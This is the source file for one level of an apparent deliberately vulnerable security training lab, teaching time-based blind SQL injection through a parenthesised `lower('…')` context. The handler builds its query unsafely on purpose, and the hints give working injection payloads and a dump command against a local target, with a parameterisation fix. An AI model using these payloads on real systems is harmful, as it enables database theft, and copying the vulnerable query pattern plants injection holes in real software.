"""Level 8 — The Watchman. Time-based blind SQL injection in a **parenthesised** string
context: the value lands inside a function call, `lower('<you>')`, so the breakout is
`')` — not a bare quote. The page never changes; only the clock does. (The room that
catches a time-based engine that only tries `'`/`\"` and never the paren breakout.)"""

from __future__ import annotations

import html

from deadwood import ui
from deadwood.level import Level, Request, Response, register


@register
class TheWatchman(Level):
    num = 8
    slug = "the-watchman"
    title = "The Watchman"
    tier = "Hard"
    category = "SQL injection — time-based (parenthesised context)"
    brief = "The night-watch logbook answers every name the same. Time the silence."
    objective = ("The watch-roster check at `/l/the-watchman/app?q=Bullock` folds your input into "
                 "`lower('<input>')` — a function call. The page is identical no matter what; only "
                 "the response *time* leaks. Break out of the **paren** (`')`), gate a sleep on a "
                 "comparison, and read `secrets` (label `the-watchman`).")
    hints = [
        "The reply is byte-for-byte constant. Your input sits inside lower('…'), so a bare quote "
        "won't close it — you need ') to escape the string AND the parenthesis.",
        "Prove the sink with time. No name matches, so a bare AND short-circuits before the sleep — "
        "anchor it past the match on a row that exists: q=x') OR (id=1 AND sleep(2))-- -  stalls ~2s; "
        "swap in sleep(0) and it's instant. That ') breakout — string *and* paren — is the trick.",
        "Now gate the sleep on the data, one char at a time: "
        "q=x') OR (id=1 AND (CASE WHEN (unicode(substr((SELECT value FROM secrets WHERE label='the-watchman'),1,1))>64) THEN sleep(2) ELSE 0 END))-- -",
        "hickok needs the paren context for the sleep here — point it in and read it out (slow, a "
        "request per bit): `hickok sql -u 'http://127.0.0.1:8666/l/the-watchman/app?q=Bullock' -p q "
        "--technique time --dump secrets`",
    ]
    remediation = ("Parameterize. A function-wrapped value (`lower(?)`) with the parameter bound takes "
                   "the input out of the SQL entirely — the ') breakout has nothing to close.")
    source = (
        "q = req.query.get('q', 'Bullock')\n"
        'sql = f"SELECT count(*) FROM customers WHERE lower(name)=lower(\'{q}\')"   # paren + quote\n'
        "db.execute(sql).fetchone()   # result ignored — constant reply, only timing leaks"
    )

    def seed(self, db):
        db.execute("INSERT INTO secrets (label, value) VALUES (?,?)", ("the-watchman", self.flag()))
        db.commit()

    def handle(self, req: Request, db) -> Response:
        q = req.query.get("q", "Bullock")
        sql = f"SELECT count(*) FROM customers WHERE lower(name)=lower('{q}')"
        try:
            db.execute(sql).fetchone()       # thrown away; the only signal is the clock
        except Exception:
            pass
        body = f"""
        <h1>Deadwood Trust — Night-Watch Roster</h1>
        <p class="dim">Check a name against the watch logbook.</p>
        <form method="get" action="/l/the-watchman/app">
          <input name="q" value="{html.escape(q)}" size="44"> <button>check</button>
        </form>
        <p class="ok">checked against the roster.</p>
        <p class="dim" style="margin-top:18px"><a href="/l/the-watchman">&larr; back to the briefing</a></p>
        """
        return Response(ui.shell("The Watchman — Night-Watch Roster", body))
